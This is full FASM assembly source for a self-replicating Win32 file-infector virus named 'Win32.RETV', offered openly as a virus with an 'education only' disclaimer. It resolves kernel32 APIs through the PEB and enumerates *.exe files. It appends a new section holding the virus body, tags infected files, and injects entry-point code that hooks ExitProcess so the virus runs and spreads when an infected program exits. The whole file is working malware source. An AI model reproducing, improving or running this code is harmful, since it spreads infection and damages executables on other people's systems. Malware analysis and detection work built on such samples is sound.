;Win32.RETV
;tivuboy


; Win32.RETV by tivuboy
; This virus will insert code at entry point. The code will
; [R]edirect VA of [E]xitProcess [T]o [V]irus code.

; I would like to thank BlueOwl for his tutorials and source
; codes, I learnt a lot from them. In this virus I use a lot
; of his code snippets taken from RRLF issue #5. Shouts also
; goes to: RRLF, F-13, 29A, EOF groups.

; This source code is for education purposes only.
; I am not responsible for any damages you cause.

; Any comments, ideas or critics are welcome at
; tivuboy@gmail.com.

; the code starts here
format pe gui 4.0

include 'win32a.inc'

; .macro

macro wcall proc,[arg]			; wcall procedure (indirect) (modified FASM invoke macro)
 { common				; a macro for calling windows apis ;)
    if ~ arg eq
     stdcall [ebp+proc],arg
    else
     call [ebp+proc]
    end if }

; .equates

		; simple equates
		virus_size		equ (virus_end-virus_start)
		FindDataSize		equ 13Eh	; sizeof.WIN32_FIND_DATA
		FileSize		equ 20h 	; WIN32_FIND_DATA.nFileSizeLow
		FileName		equ 2Ch 	; WIN32_FIND_DATA.cFileName
		FileAttr		equ 0		; WIN32_FIND_DATA.dwFileAttributes


; .code

virus_start:

		call	get_delta
get_delta:	pop	ebp
		sub	ebp, get_delta

		; get kernel32.dll's image base from 'Understanding Windows Shellcode'
		xor	eax, eax		; eax = 0
		mov	eax, [fs:eax+30h]	; [fs:0] = pointer to TEB, [fs:30] points to PEB
		mov	eax, [eax+$C]		; eax = pointer to PEB_LDR_DATA
		mov	esi, [eax+1Ch]		; extract the first entry
		lodsd				; grab the next entry in list which points to kernel32
		mov	ebx, [eax+8]		; grab the image base of kernel32 and store in ebx

		mov	edx, [ebx+$3C]
		add	edx, ebx

		mov	edx, [edx+78h]
		add	edx, ebx		; edx = export table va
		mov	esi, [edx+20h]
		add	esi, ebx		; esi = va to function names
		xor	ecx, ecx		; ecx = 0

; Search for GetProcAddr Function. With only this function, we can
; get any function's addr in kernel32.dll
find_GetProcAddr:
		inc	ecx
		lodsd				; eax = address to function name
		add	eax, ebx
		cmp	dword [eax], "GetP"
		jnz	find_GetProcAddr
		cmp	dword [eax+4], "rocA"
		jnz	find_GetProcAddr
		cmp	dword [eax+8], "ddre"
		jnz	find_GetProcAddr

		dec	ecx			; ecx = ordinal of GetProcAddr

		mov	esi, [edx+1Ch]		; esi = rva to AddrOfFuncs
		add	esi, ebx
		mov	edx, [esi+ecx*4]
		add	edx, ebx		; edi = address of GetProcAddr
		mov	[ebp+GetProcAddr], edx

		lea	esi, [ebp+apis_func]
		lea	edi, [ebp+apis_addr]
		mov	ecx, 11 		; 11 apis

load_apis:	push	esi edi ecx		; these registers must be saved

		wcall	GetProcAddr, ebx, esi	; call other functions

		pop	ecx edi esi
		stosd				; save addr of functions

find_end_of_api:lodsb				; load a byte
		cmp	al, 0			; is this byte a zero (end of api)
		jnz	find_end_of_api
		loop	load_apis		; continue to get the next api

		; Allocate Memory for Find Data
		wcall	GlobalAlloc, GMEM_FIXED, FindDataSize
		test	eax, eax
		jz	AllocErr
		mov	[ebp+findmem], eax

		; Find file to infect
		lea	eax, [ebp+exe_mask]
		wcall	FindFirstFile, eax, [ebp+findmem]
		inc	eax
		je	FindErr
		dec	eax
		mov	[ebp+findhandle], eax

more_hosts:	call	infect_file
		; Find next file to infect
		wcall	FindNextFile, [ebp+findhandle], [ebp+findmem]
		test	eax, eax
		jnz	more_hosts

		wcall	FindClose, [ebp+findhandle]

FindErr:
		wcall	GlobalFree, [ebp+findmem]

AllocErr:
		wcall	ExitProcess, 0			; exit


infect_file:	mov	edi, [ebp+findmem]
		mov	eax, [edi+FileSize]		; eax = size of program
		add	eax, virus_size 		; eax = calculated new size of program
		mov	[ebp+newsize], eax

		lea	esi, [edi+FileName]		; esi points to file's name

		wcall	CreateFile, esi,GENERIC_READ or GENERIC_WRITE,0,0,\
			OPEN_EXISTING,dword[edi+FileAttr],0
		inc	eax
		jz	OpenFileErr
		dec	eax
		mov	[ebp+filehandle], eax

		wcall	CreateFileMapping, eax, 0, PAGE_READWRITE, 0, [ebp+newsize], 0
		test	eax, eax
		jz	CreateMapErr
		mov	[ebp+maphandle], eax

		wcall	MapViewOfFile, eax, FILE_MAP_WRITE, 0, 0, [ebp+newsize]
		test	eax, eax
		jz	MapErr

		; check if this exe is valid
		mov	ebx, eax
		cmp	word [ebx], "MZ"
		jnz	Error
		mov	edi, [ebx+3Ch]
		add	edi, ebx			; edi = peheader
		cmp	dword [edi], "PE"
		jnz	Error

		cmp	dword [edi+4Ch], "RETV" 	; if already infected ?
		jz	Error

		mov	dword [edi+4Ch], "RETV" 	; put infection sign

		mov	esi, edi			; esi = pe header
		movzx	eax, word [edi+6]		; eax = numberOfSections
		imul	eax, 28h			; Size of Section = 28h
		add	esi, eax
		add	esi, 18h			; at 18h offset, OptionalHeader begins
		movzx	eax, word[edi+14h]		; SizeOfOptionalHeader is at 14h offset
		add	esi, eax			; esi = pointer to the last section

		cmp	dword[esi+24h], 0		; is this free space to add a new section
		jnz	Error

		mov	dword[esi], '.dat'
		mov	byte[esi+4], 'a'		; set section's name = .data
		mov	dword[esi+24h], $C0000040	; set section's flags = read/write data
		mov	dword[esi+8h], virus_size	; set sections' virtualsize
		mov	dword[esi+10h], virus_size	; set rawsize
		mov	eax, dword[esi-28h+$C]		; get the previous section's virtualAddr
		add	eax, 1000h			;
		mov	[esi+$C], eax			; set section's virtualAddr
		mov	eax, dword[esi-28h+14h] 	; get the previous section's rawAddr
		add	eax, dword[esi-28h+$10] 	; add it by rawsize
		mov	[esi+$14], eax			; set section's PointerToRawData
		add	dword[edi+50h], 1000h		; increase SizeOfImage by 1000h
		inc	word[edi+6]			; increase number of sections

		mov	eax, [esi+$C]			;
		add	eax, [edi+34h]			;
		mov	[ebp+VirusCode], eax		; save va to virus code

		mov	eax, [edi+28h]			;
		add	eax, [edi+34h]			;
		mov	[ebp+entryPoint], eax		; save entrypoint
		
		pushad
		call	InjectCode
		popad

		mov	ecx, virus_size
		mov	edi, [ebp+findmem]
		mov	edi, [edi+FileSize]
		add	edi, ebx		    ; edi = ptr to begining of last section
		lea	esi, [ebp+virus_start]	    ; esi = ptr to start of virus
		rep	movsb

Error:
		wcall	UnmapViewOfFile, ebx
MapErr:
		wcall	CloseHandle, [ebp+maphandle]

CreateMapErr:
		wcall	CloseHandle, [ebp+filehandle]	     ; close file handle

OpenFileErr:

		ret

InjectCode:
	mov	edx, [edi+80h]			;edx = RVA to Import Table
	
	mov	esi, edi
	add	esi, 18h
	movzx	ecx, word[edi+14h]
	add	esi, ecx			;esi = pointer to begin of section tables
	push	esi
	
search_Import_table:
	cmp	[esi+$C], edx			;$C = offset of VirtualAddr
	je	found_import_table
	add	esi, 28h			;28h = sizeofSectionTable 
	jmp	search_Import_table

found_import_table:
	mov	esi, [esi+14h]			; esi = RawOffSet to Import Dir
	mov	ecx, esi			; ecx = Beginning of Import Dir
	add	esi, ebx			; esi = RawAddr to Import Dir
	
search_lib:
	mov	eax, [esi+$C]			; edi + $C = RVA to library name
	sub	eax, edx			; eax = offset to Lib name
	add	eax, ecx
	add	eax, ebx			; eax = RawAddr to lib name
	cmp	dword[eax], 'KERN'		; is this KERNEL32.DLL
	je	found_lib
	cmp	dword[eax], 'kern'		; is this kernel32.dll
	je	found_lib
	add	esi, 14h			; 14h = sizeOfImportDirectory
	jmp	search_lib
	
found_lib:
	mov	eax, [esi+10h]			; eax = rva to IAT
	sub	eax, edx
	add	eax, ecx
	add	eax, ebx			; eax = RawAddr to IAT
	
search_func:
	push	eax
	mov	eax, [eax]			; eax = rva to func
	sub	eax, edx
	add	eax, ebx
	add	eax, ecx			; eax = rawAddr to func
	cmp	dword[eax+3], 'xitP'		; is this E[xitP]rocess func
	je	found_func
	pop	eax
	add	eax, 4				; eax = next rva to func
	jmp	search_func 

found_func:
	pop	eax				; clear stack
	sub	eax, ebx
	sub	eax, ecx
	add	eax, edx			; eax = rva to func
	add	eax, [edi+34h]
	mov	[ebp+rvatoEP], eax		; save va to func

	mov	eax, [edi+28h]	
	pop	edx				; eax = entry point
						; edx = pointer to beginning of section table
find_start_section:
	cmp	eax, [edx+$C]
	jle	found_addr
	add	edx, 28h			; edx points to the next section header
	jmp	find_start_section
	
found_addr:
	push	ebx
	mov	edi, [edx+8]			; edi = VirtualSize
	add	edi, [edx+$C]			; edi += VirtualAddr
	add	ebx, [ebx+3Ch]			; edx points to pe header
	mov	[ebx+28h], edi			; set new entry point
						; which address to injected_code

	pop	ebx
	mov	edi, ebx
	add	edi, [edx+8]
	add	edi, [edx+$14]			; edi = address to free space in code section

	lea	esi, [ebp+injected_code]
	mov	ecx, end_inject_code - injected_code
	rep	movsb
	
	ret

;This code will be inject at entrypoint.
;It will redirect Address of ExitProcess to Virus code address

injected_code:
	
	call	delta
delta:
	pop	ebp
	sub	ebp, delta

	mov	edx, [ebp+VirusCode]
	mov	eax, [ebp+rvatoEP]
	mov	[eax], edx
	jmp	dword[ebp+entryPoint]
	
	rvatoEP 	dd	0	;rva to ExitProcess
	VirusCode	dd	0	;beginning of virus code
	entryPoint	dd	0	;original Entry point of exe
end_inject_code:

; .data
apis_func:	db	"CloseHandle",0 ; Kernel32.dll Apis
		db	"CreateFileA",0
		db	"CreateFileMappingA", 0
		db	"ExitProcess", 0
		db	"FindClose",0
		db	"FindFirstFileA",0
		db	"FindNextFileA",0
		db	"GlobalAlloc",0
		db	"GlobalFree",0
		db	"MapViewOfFile",0
		db	"UnmapViewOfFile",0

		exe_mask	db	"*.exe", 0

	      

; .data?

apis_addr:	CloseHandle		dd ?	; Kernel32.dll Apis' Addr
		CreateFile		dd ?
		CreateFileMapping	dd ?
		ExitProcess		dd ?
		FindClose		dd ?
		FindFirstFile		dd ?
		FindNextFile		dd ?
		GlobalAlloc		dd ?
		GlobalFree		dd ?
		MapViewOfFile		dd ?
		UnmapViewOfFile 	dd ?
		
		GetProcAddr  dd ?	; GetProcAddress handle

		findmem 	dd ?	; Other handles
		findhandle	dd ?
		newsize 	dd ?
		filehandle	dd ?
		maphandle	dd ?
virus_end:

